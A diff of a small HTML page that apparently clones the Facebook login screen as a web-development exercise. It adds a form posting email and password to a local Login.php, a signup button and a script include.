@@ -1,12 +1,15 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
+    
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Document</title>
     <link rel = "stylesheet" href = "style.css">
 </head>
 <body>
+   
+
     <h1>facebook</h1>
     <div class="whole">
         <div>
@@ -15,38 +18,38 @@
         
     
     <div class = "container">
+        <form id="regestered" method="POST" action="Login.php">
         <div class = "field">
             <div class="In">
             
-            <input type = "text" id="username" placeholder = "Enter your username">
+            <input type = "text" name= "email" id="email" placeholder = "Enter your email">
             
-            <input type = "password" id="password" placeholder = "Enter your password">
+            <input type = "password" name="password" id="password" placeholder = "Enter your password">
             </div>
         
         
          <div>
-        <button id = "login">Login</button>
+        <button type ="submit" id = "login">Login</button>
          </div>
-
-        
         </div>
+        </form>
         <div class="or">
             <div>
 
-        <a href="Url" id = "forget-password"> Forget account ?</a>
+        <a id = "forget-password"> Forget account ?</a>
             </div>
             <div class="hr">
         <hr> or <hr>
         </div>
           <div>
-         <button id = "create"> Create New Account</button>
+         <button onclick="window.location.href='signup.html'" id = "create"> Create New Account</button>
          </div>
         </div>
     
     </div>
     </div>
     
-
+<script src="fb.js" ></script>
     
 </body>
 </html>
